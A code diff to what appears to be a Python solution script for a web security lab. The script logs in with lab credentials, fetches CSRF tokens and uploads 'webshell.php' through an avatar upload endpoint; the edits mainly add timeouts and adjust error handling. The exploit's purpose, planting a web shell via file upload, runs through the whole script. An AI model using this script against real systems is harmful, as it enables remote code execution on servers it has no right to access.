@@ -9,18 +9,18 @@ def extract_csrf_token(response):
     csrf_token = soup.find("input", {"name": "csrf"})["value"]
     return csrf_token
 
+
 def login(url, session):
     response = session.get(f"{url}/login", timeout=10)
-    csrf_token = extract_csrf_token(response)
-
-    login_data = {
-        "csrf": csrf_token,
-        "username": "wiener",
-        "password": "peter"
-    }
-
-    login_response = session.post(f"{url}/login", data=login_data, timeout=10)
-    return login_response.status_code == 200
+    if response.status_code == 200:
+        csrf_token = extract_csrf_token(response)
+        login_data = {
+            "csrf": csrf_token,
+            "username": "wiener",
+            "password": "peter"
+        }
+        login_response = session.post(f"{url}/login", data=login_data, timeout=10)
+        return login_response.status_code == 200
 
 
 def upload_file(url, session):
@@ -36,7 +36,7 @@ def upload_file(url, session):
         "csrf": csrf_token
     }
 
-    upload_response = session.post(f"{url}/my-account/avatar", files=file, data=data)
+    upload_response = session.post(f"{url}/my-account/avatar", files=file, data=data, timeout=10)
     return upload_response.status_code == 200
 
 
@@ -58,7 +58,7 @@ def main():
 
         print("(+) Logging in...")
         if not login(url, session):
-            print("Something went wrong. Check your URL and try again.")
+            print("(-) Something went wrong. Please check your URL and try again.")
             sys.exit(1)
 
         print("(+) Uploading webshell.php")
@@ -71,15 +71,12 @@ def main():
 
     except requests.exceptions.Timeout:
         print("(-) Request timed out.")
-        sys.exit(1)
 
     except requests.exceptions.MissingSchema:
         print("(-) Please enter a valid URL.")
-        sys.exit(1)
 
     except requests.exceptions.ConnectionError:
         print("(-) Unable to connect to host. Please check your URL and try again.")
-        sys.exit(1)
 
 
 if __name__ == "__main__":
